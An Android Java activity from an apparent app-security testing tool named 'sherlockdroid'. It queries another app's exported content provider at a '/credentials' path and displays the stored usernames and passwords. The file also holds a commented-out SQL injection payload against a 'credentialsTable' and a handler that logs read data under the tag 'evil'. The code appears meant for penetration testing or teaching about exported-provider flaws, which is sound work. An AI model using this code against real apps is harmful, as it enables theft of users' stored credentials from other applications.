package com.example.sherlockdroid.tools;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.example.sherlockdroid.R;

public class ExportedContent extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.content_uri_db);
        Button loadButton= (Button) findViewById(R.id.loadButton);
        String PACKAGE = getIntent().getStringExtra("Package");
        String ContentURI= getIntent().getStringExtra("ContentURI");
        String ContentProvider= getIntent().getStringExtra("ContentProvider");
        Log.v("LOGGG1",PACKAGE);
        Log.v("LOGGGG2",ContentURI);
        Log.v("LOGGGG3",ContentProvider);
        //CPMap cpm = new CPMap(this, new Bundle(), PACKAGE);
        //CPReport report = cpm.map();
        //Log.v("CONTENT",report.toString());
        //ArrayList<String[]> rows = cpm.dump("* FROM credentialsTable WHERE 2=2 --.");
        ContentURI= "content://"+ ContentURI + "/credentials";
        //Log.v("SQL INJECTION",rows.toString());
        Log.v("CONTENT URIII",ContentURI.toString());

        String finalContentURI = ContentURI;
        loadButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //1 MODO
                TextView resultView = (TextView) findViewById(R.id.res);
                try {
                    Cursor cursor = getContentResolver().query(Uri.parse(finalContentURI), null, null, null, null);
                    if (cursor.moveToFirst()) {
                        StringBuilder strBuild = new StringBuilder();
                        while (!cursor.isAfterLast()) {
                            strBuild.append("\n" + cursor.getString(cursor.getColumnIndex("id")) + "-" + cursor.getString(cursor.getColumnIndex("username")) + "-" + cursor.getString(cursor.getColumnIndex("password")));
                            cursor.moveToNext();
                        }
                        resultView.setText(strBuild);
                    } else {
                        resultView.setText("No Records Found");
                    }

                } catch (Exception e) {
                    resultView.setText("java.lang.SecurityException: Permission Denial --> (exported=true)");
                }
            }

        });//Chiusura button Loading

    }//chiusura metodo OnCreate
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        try {
            Log.d("evil",getContentResolver().openInputStream(data.getData()).toString());
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
